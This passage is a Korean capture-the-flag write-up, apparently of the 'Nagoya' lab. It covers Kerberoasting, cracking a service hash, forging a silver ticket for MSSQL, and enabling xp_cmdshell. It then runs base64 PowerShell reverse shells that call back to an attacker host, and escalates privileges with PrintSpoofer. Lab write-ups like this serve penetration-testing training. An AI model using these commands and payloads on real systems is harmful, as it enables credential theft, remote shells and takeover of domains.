http/nagoya.nagoya-industries.com   svc_helpdesk  CN=helpdesk,CN=Users,DC=nagoya-industries,DC=com  2023-04-30 11:31:06.190955  <never>
MSSQL/nagoya.nagoya-industries.com  svc_mssql                                                       2023-04-30 11:45:33.288595  2024-08-02 05:48:41.441299



[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc_helpdesk$NAGOYA-INDUSTRIES.COM$nagoya-industries.com/svc_helpdesk*$1dbe3a0a505a7e08f6c414577be11fed$22384dc2bae7f2e4c8352ab8c52a99c6e59a4cbb8dce6de555d1b259b997690718c203be8e29a18e4d5140af31260c66c879b1180eeb91478a4b595362bd3133565dc43f13f22bcd028aca0e8dd5a786f450ace31a1afd63c216f13c4f55300f6bf822505b8ce0a8ea0943f6947ba212f5f9888a5d42c4378a6352a472b35750858d5c3454d129ab1d3e40dd8ee72472ce1118ff10119aa3c1565c221b3b54b1f671332e7b8e11b2befe42f2d7cd9a04c834132dc0939819186e59d07dcc739adb2695910c915122c21e54d4e05f8c46c947d8aca21e65db27468970aecbd664c7f0f6fbb7dc74d76962bf18dfd27437260f40b6ac032ee8d508fdb44eb0f4d13a9bfbc8b828bbca543d701b0615e0a73a88eafbce0aa62384ac864a6ddd22d7f898f37e396da1397fd0f3229a2b2556bd679c2e86c3a8b31d99eb7891030954fd553aabbd0deac6c46a462728631408f370b475fde285adedc46cf331ca21a83f44f8cceabf68a7a6b5487447610e2bc45f39d2754443b250bf8521473032b3c4d1e8f11b543b171f06444e403ab8eeab0f5cadb93db6a822147f95836ad34522c5e3b2f944b6da322a237721e30331113394dc6d2f07a9cdd7e223773cb84166030c26d306208eb52809145f8dd82ac02e1fde36d1d96aeefc1250903948e2aa113b9c7539aa8daf031012b7fe4c550e5f394674a71071815f05fb83365fff12f2ce069b213391a433599d428055caf3644fcb077f22d2da4cb4e249e968d83a321097dc5a6f4bcd7a59cf316379a832baac5dcdb2659dbd89f874e28ef437b468e096c0ef9aebe232399fce031217aff6e0de4c5f1ed55b81d11c8932e491f08b84c18ad92d75eb52624fac2c939f5c10fd31022902288adba7684a25441abb61ab5c0d6f46dde5baa0d75dfece68162e93144b42a447373c700aea3b6dbcc1558ab9c50ff3b42c1ec16f244317f96b8c01877a0b3088db4f2d30f19907821d53756560408a8039e2fd6d6a4ccc0a012307559b775e68dcf0e638a3fab4894c57f147c07abe448cd1262b67acb811ced2e2001f9a19e02926fb31976d73a87951a238ed106795431ff505321d7b5f75995aa3e88cd076a7b5d3b70799ccd311ea10180e97b39d5861a189d14979f24721edc139bb85522e98ea18d64334fe3b37319c035f940c68ea3a05de5b79cfb9fcf71d67ca67e4be89f5206cc035c7ec7ab032332ccc92ab917d780bedd9bb00a53297d01441d416573313f8b9feb7dda86ae6aa794efac8b5fa7dbaf2ce2aacc74f41dd8c3827bf2d318ac799c1738e8d60c05018669e318349bc64967efcccc3fc0c4516d7265b7551bbe95aef1489a117fe0bf99b664fa1b578d27c38d94d64d64989ec31989712f136d7f3c269c3773a51f036e97fc9f747b734c8222a97e8e78ade279cdcfc6244ca45a9b6895abbcb8391c6541e24c9766882c7847cab00d5a7d5caf5956b53d1d8c346768093d8794472cc0f29c2a30465bca0e3c96cf25e7079f6626e8fbf890c8fd2f2601d0d8f2ec822847cbbbdd731713a03314e0c57b2257d8630ad95f3a4f0aaff5f0a81b9d8d7888edcbd8282725f072ff83e34b50c797c5d320781cff0b8dfcbd87b683e176e71d1ed57e8
$krb5tgs$23$*svc_mssql$NAGOYA-INDUSTRIES.COM$nagoya-industries.com/svc_mssql*$c704ff70b506305ca60bef2bd4e1aa8b$e780761d4dfb1097af51fe68e99ad19a11914823db51d8bdf52d2e91684829eeb0422d2a283392c8cc4c2e3e4eb418dfba87420809977928052fdb9c074a48f37f8803ce15cc3e5ac2920420ebd565689c070db8031a467b915e3efb2242e656d557660b803d7252ee3478f208ee63edd5dbb5cba527d3f38ce91a0fb0bbe37d9944fec7e0bc98dba61648b9ef7fb756e962de915d60a6d74c9337a31df9aa9bfdfec8bf0a4f090bdc2f3267c9dc38eef0fdc1f9dcd4632c71903b24364d1d85967afdcf50fd8218461299fca3d0f48fd3c6b683f8d3a883c9329aed55f7d706d92b33f33fbb1e77d77107666ac31ac3b20ebe4eaa971f1db9802da8b5e9a69385023f261e6cadcfae35b4c54e10ce1fd9f198d8ab0cd923d1761666a892b0a343dae1f11775d533931c65e2ca2ce7f0433ccce4da5a234cf9f6787807588431047e95e282b43a48f5342743094179c938ba7c81b3e11534b7c6200e19b9fb48bce3be19f52dfa0a7f6689acc80fa2d1a59344d13e8a35ea26480f0f53d6bb1cb9caa0fd6a262817abe703ebb0f7790cd83cdf99b832cd3036330fe24a85e5ecb6f21bf0963eb2feaeea68004a58d2b38b2a9ca7cbab5c27ac9a0c7e93fcea8d80aaef9f3f20a53712a3ea763aaf40a46a0e814b3d8c0720e6acf4f64e93cff1cadaa8910e8f80108c24dcd392628e56d785a936726cc49048f112fe586355b23c00d8552811d7714b58d6baeee06e3054b7302736a49b9d39a7fb1b422b51912f8765d63d94dfc5690804dee86316aa802107437348079f66535e878a354ffedac78af8a2d6ada0f34e0fc405b164d470d15a75826fd3321599e5b20db0f4b2ae5e0600fcee50469a01fbb2911d20853fe9b4b490afa38ea2ea85f0250275e1da775559ef91b83299ea27408e70df7b910150a771636f11176e2f08ecc5966bff8619ea0f7055b273e5407c016592a25f66c0bf6159ac2365ece294f3964e1bb0fa38348e28d0864e3acb05518c14dc3a2079c9a7cbed5dc8bfcbb2bcd840c82afbdfe0db7eaefa4741fa1e2a504158e3f07282f658b78d10f0b23784259ae77de05cff7a32787aaad8a954e2016cfa6467e4d3c9a8294cf18a79b29a1e49586004f4ed78d0f87670c027d7b55c67dbe7aa4f181079d7987205a01ec44140b5125f7f3aa97c9bb10f28b55d42af4870db918878df216e10fafc25aa1388d7a6ae36255ae4bdfadd488869837308bde30c8407d8d1df9086dc047e4cb439aaad6a68c005ba7da25acbe4181344febf590f34792c875179f6f3fb33d72f268bdcf78d4cc846e572a31be9351bba69814b6de7e9776832108f6e4ac04e07bda7fe56fb8d7da965cf491c494aed1da6333ea934c1e9bb1ae7a15443984f2e80f3be5d310743e72489764e0b2365d9bfd2cf9ef6abc491dd408a5b35db97470edf4eaf6472bd235beba57c78647b9617a8fd13c6af4456adcef5b22e23e05094fed35a9b00b628e147d671b79acd01e66734a3cf4a9373e7486cd00cc48af498a53a40b2f1cd6651e03399e8f501adb617245e8fb68b687ccc6ffa49fd34d205461b0d63b221e69f2b31f7f09518a4b63cd2f15b488e0c3c01c8c81df9163afeee5afa28cd4d00050180c286
```

해당 해쉬를 복호화 했다. 

```bash
┌──(root㉿kali)-[/home/kali/PG/Nagoya]
└─# hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --show
$krb5tgs$23$*svc_mssql$NAGOYA-INDUSTRIES.COM$nagoya-industries.com/svc_mssql*$c704ff70b506305ca60bef2bd4e1aa8b$e780761d4dfb1097af51fe68e99ad19a11914823db51d8bdf52d2e91684829eeb0422d2a283392c8cc4c2e3e4eb418dfba87420809977928052fdb9c074a48f37f8803ce15cc3e5ac2920420ebd565689c070db8031a467b915e3efb2242e656d557660b803d7252ee3478f208ee63edd5dbb5cba527d3f38ce91a0fb0bbe37d9944fec7e0bc98dba61648b9ef7fb756e962de915d60a6d74c9337a31df9aa9bfdfec8bf0a4f090bdc2f3267c9dc38eef0fdc1f9dcd4632c71903b24364d1d85967afdcf50fd8218461299fca3d0f48fd3c6b683f8d3a883c9329aed55f7d706d92b33f33fbb1e77d77107666ac31ac3b20ebe4eaa971f1db9802da8b5e9a69385023f261e6cadcfae35b4c54e10ce1fd9f198d8ab0cd923d1761666a892b0a343dae1f11775d533931c65e2ca2ce7f0433ccce4da5a234cf9f6787807588431047e95e282b43a48f5342743094179c938ba7c81b3e11534b7c6200e19b9fb48bce3be19f52dfa0a7f6689acc80fa2d1a59344d13e8a35ea26480f0f53d6bb1cb9caa0fd6a262817abe703ebb0f7790cd83cdf99b832cd3036330fe24a85e5ecb6f21bf0963eb2feaeea68004a58d2b38b2a9ca7cbab5c27ac9a0c7e93fcea8d80aaef9f3f20a53712a3ea763aaf40a46a0e814b3d8c0720e6acf4f64e93cff1cadaa8910e8f80108c24dcd392628e56d785a936726cc49048f112fe586355b23c00d8552811d7714b58d6baeee06e3054b7302736a49b9d39a7fb1b422b51912f8765d63d94dfc5690804dee86316aa802107437348079f66535e878a354ffedac78af8a2d6ada0f34e0fc405b164d470d15a75826fd3321599e5b20db0f4b2ae5e0600fcee50469a01fbb2911d20853fe9b4b490afa38ea2ea85f0250275e1da775559ef91b83299ea27408e70df7b910150a771636f11176e2f08ecc5966bff8619ea0f7055b273e5407c016592a25f66c0bf6159ac2365ece294f3964e1bb0fa38348e28d0864e3acb05518c14dc3a2079c9a7cbed5dc8bfcbb2bcd840c82afbdfe0db7eaefa4741fa1e2a504158e3f07282f658b78d10f0b23784259ae77de05cff7a32787aaad8a954e2016cfa6467e4d3c9a8294cf18a79b29a1e49586004f4ed78d0f87670c027d7b55c67dbe7aa4f181079d7987205a01ec44140b5125f7f3aa97c9bb10f28b55d42af4870db918878df216e10fafc25aa1388d7a6ae36255ae4bdfadd488869837308bde30c8407d8d1df9086dc047e4cb439aaad6a68c005ba7da25acbe4181344febf590f34792c875179f6f3fb33d72f268bdcf78d4cc846e572a31be9351bba69814b6de7e9776832108f6e4ac04e07bda7fe56fb8d7da965cf491c494aed1da6333ea934c1e9bb1ae7a15443984f2e80f3be5d310743e72489764e0b2365d9bfd2cf9ef6abc491dd408a5b35db97470edf4eaf6472bd235beba57c78647b9617a8fd13c6af4456adcef5b22e23e05094fed35a9b00b628e147d671b79acd01e66734a3cf4a9373e7486cd00cc48af498a53a40b2f1cd6651e03399e8f501adb617245e8fb68b687ccc6ffa49fd34d205461b0d63b221e69f2b31f7f09518a4b63cd2f15b488e0c3c01c8c81df9163afeee5afa28cd4d00050180c286:Service1
```

## 2.3. christopher.lewis -> svc_mssql

`svc_mssql` 로 접근하고 싶은데 해당 서비스는 1433 번 서비스를 이용하는 거를 확인할 수 있었지만 내부에서만 접근이 가능하다. 

```bash
*Evil-WinRM* PS C:\Users\Christopher.Lewis\Documents> netstat -ano | findstr 1433
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       4372
  TCP    [::]:1433              [::]:0                 LISTENING       4372
```

우리는 이 작업을 진행하기 위해서 `chisel` 을 사용했다. 먼저 `agent.exe` 를 윈도우로 옮기고 진행했다. 

그 다음 실버티켓을 받기위한 작업을 진행했다. 여기서 DomainSID 는 `S-1-5-21-1969309164-1513403977-1686805993` 이다. 

```
*Evil-WinRM* PS C:\Users\Christopher.Lewis\Documents> get-addomain


AllowedDNSSuffixes                 : {}
ChildDomains                       : {}
ComputersContainer                 : CN=Computers,DC=nagoya-industries,DC=com
DeletedObjectsContainer            : CN=Deleted Objects,DC=nagoya-industries,DC=com
DistinguishedName                  : DC=nagoya-industries,DC=com
DNSRoot                            : nagoya-industries.com
DomainControllersContainer         : OU=Domain Controllers,DC=nagoya-industries,DC=com
DomainMode                         : Windows2016Domain
DomainSID                          : S-1-5-21-1969309164-1513403977-1686805993
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=nagoya-industries,DC=com
Forest                             : nagoya-industries.com
InfrastructureMaster               : nagoya.nagoya-industries.com
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=nagoya-industries,DC=com}
LostAndFoundContainer              : CN=LostAndFound,DC=nagoya-industries,DC=com
ManagedBy                          :
Name                               : nagoya-industries
NetBIOSName                        : NAGOYA-IND
ObjectClass                        : domainDNS
ObjectGUID                         : 1153c877-efa1-443b-b59f-c32c9286750e
ParentDomain                       :
PDCEmulator                        : nagoya.nagoya-industries.com
PublicKeyRequiredPasswordRolling   : True
QuotasContainer                    : CN=NTDS Quotas,DC=nagoya-industries,DC=com
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {nagoya.nagoya-industries.com}
RIDMaster                          : nagoya.nagoya-industries.com
SubordinateReferences              : {DC=ForestDnsZones,DC=nagoya-industries,DC=com, DC=DomainDnsZones,DC=nagoya-industries,DC=com, CN=Configuration,DC=nagoya-industries,DC=com}
SystemsContainer                   : CN=System,DC=nagoya-industries,DC=com
UsersContainer                     : CN=Users,DC=nagoya-industries,DC=com
```

`svc_mssql` 의 `SPN` 은 `MSSQL/nagoya.nagoya-industries.com` 이다.

```bash
*Evil-WinRM* PS C:\Users\Christopher.Lewis\Documents> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | Select-Object Name,ServicePrincipalName

Name         ServicePrincipalName
----         --------------------
svc_helpdesk {http/nagoya.nagoya-industries.com}
krbtgt       {kadmin/changepw}
svc_mssql    {MSSQL/nagoya.nagoya-industries.com}
```

그 다음 `impacket-ticketer` 를 이용해서 실버티켓을 발급받았다. 

```bash
┌──(root㉿kali)-[/home/kali/PG/Nagoya]
└─# impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid "S-1-5-21-1969309164-1513403977-1686805993" -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com Administrator
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for nagoya-industries.com/Administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

마지막으로 `KRB5CCNAME` 에다가 실버티켓을 저장하고 `klist` 를 통해서 제대로 저장됐는지를 확인했다. 

```bash
┌──(root㉿kali)-[/home/kali/PG/Nagoya]
└─# export KRB5CCNAME=$PWD/Administrator.ccache

┌──(root㉿kali)-[/home/kali/PG/Nagoya]
└─# klist
Ticket cache: FILE:/home/kali/PG/Nagoya/Administrator.ccache
Default principal: Administrator@NAGOYA-INDUSTRIES.COM

Valid starting       Expires              Service principal
02/13/2026 14:23:08  02/11/2036 14:23:08  MSSQL/nagoya.nagoya-industries.com@NAGOYA-INDUSTRIES.COM
	renew until 02/11/2036 14:23:08
```

그 다음 `mssqlclient` 를 이용해서 `mssql` 에 접근하면 아래와 같다. 

```bash
┌──(root㉿kali)-[/home/kali/PG/Nagoya]
└─# impacket-mssqlclient -k nagoya.nagoya-industries.com
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(nagoya\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(nagoya\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232)
[!] Press help for extra shell commands
SQL (NAGOYA-IND\Administrator  dbo@master)> 
```

`revshells.com` 에 들어가서 `powershell(base64)` 리버스 쉘 코드를 실행시킨다.

```bash
SQL (NAGOYA-IND\Administrator  dbo@master)> enable_xp_cmdshell
INFO(nagoya\SQLEXPRESS): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(nagoya\SQLEXPRESS): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (NAGOYA-IND\Administrator  dbo@master)> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA1ACIALAA4ADAAOAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

그러면 최종적으로 `svc_mssql` 의 쉘을 확보할 수 있다. 

```bash
┌──(root㉿kali)-[/home/kali]
└─# rlwrap nc -lvnp 8080
listening on [any] 8080 ...
connect to [192.168.45.215] from (UNKNOWN) [192.168.173.21] 49976

PS C:\Windows\system32> 
```

# 3. Priv Esc

## 3.1. SeImpersonatePrivilege

`whoami /priv` 를 하면 `SeImpersonatePrilvilege` 권한이 존재한다. 그걸 `PrintSpoofer64.exe` 을 통해 악용할 수 있다. 

```bash
PS C:\Users\svc_mssql\Desktop> iwr http://192.168.45.215/PrintSpoofer64.exe -o PrintSpoofer64.exe
PS C:\Users\svc_mssql\Desktop> ls


    Directory: C:\Users\svc_mssql\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/13/2026   3:11 AM          27136 PrintSpoofer64.exe
```

마찬가지로 `revshells.com` 에서 리버스 쉘 코드를 이용해 다시 공격을 진행한다. 

```bash
PS C:\Users\svc_mssql\Desktop> .\PrintSpoofer64.exe -i -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA1ACIALAA4ADAAOAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```

성공적으로 플래그를 획득할 수 있다.

```bash
┌──(root㉿kali)-[/home/kali]
└─# rlwrap nc -lvnp 8081
listening on [any] 8081 ...
connect to [192.168.45.215] from (UNKNOWN) [192.168.173.21] 50009

PS C:\Windows\system32> whoami
nagoya-ind\nagoya$
PS C:\Windows\system32> type C:\Users\Administrator\Desktop\proof.txt
5cbf0db8c89a8b9d18e9e6f7f3348438
PS C:\Windows\system32> 
```